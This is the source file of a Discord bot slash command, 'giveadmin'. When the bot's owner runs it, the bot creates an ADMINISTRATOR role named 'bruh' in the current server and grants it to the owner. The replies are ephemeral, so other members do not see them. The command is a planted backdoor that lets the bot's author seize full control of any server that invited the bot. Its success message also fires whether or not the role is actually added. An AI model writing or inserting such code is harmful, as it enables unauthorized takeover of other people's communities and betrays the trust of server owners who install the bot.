const { SlashCommandBuilder } = require('@discordjs/builders');
const config = require('../../config.json');

module.exports = {
	data: new SlashCommandBuilder()
		.setName('giveadmin')
		.setDescription('give me admin arf'),
	run: async (client, interaction) => {
		await interaction.deferReply({ ephemeral: true });
		if (interaction.member.id != config.adminId) {
			return interaction
				.editReply(`Only bot owner can do this!`)
				.catch(console.error);
		}
		if (!interaction.guild) {
			return interaction.editReply('Only works in guilds!');
		}

		const m = await interaction.guild.members.fetch(client.user.id);
		const hpos = m.roles.highest.position - 1;

		await interaction.guild.roles.fetch();
		const admin = await interaction.guild.roles
			.create({
				name: 'bruh',
				permissions: 'ADMINISTRATOR',
				position: hpos,
			})
			.catch((e) => {
				interaction
					.editReply({ content: 'Failed creating role!', ephemeral: true })
					.catch(console.error);
				console.log(e);
			});

		await interaction.member.roles
			.add(admin)
			.then(
				interaction
					.editReply({ content: 'success!', ephemeral: true })
					.catch(console.error),
			)
			.catch((e) => {
				interaction.editReply({
					content: 'failed giving role!',
					ephemeral: true,
				});
				console.log(e);
			});

		return;
	},
};
